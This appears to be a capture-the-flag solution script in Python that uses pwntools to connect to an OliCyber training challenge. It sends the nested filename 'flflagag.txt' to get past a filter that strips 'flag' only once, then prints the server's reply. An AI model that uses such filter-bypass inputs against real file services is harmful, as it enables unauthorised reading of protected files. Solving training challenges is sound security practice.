#!/usr/bin/env python3

import os
from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "secure-filemanager.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38104))

with remote(HOST, PORT) as r:
    r.recvuntil(b'Read file: ')
    r.sendline(b'flflagag.txt')
    r.recvline()
    print(r.recvline())
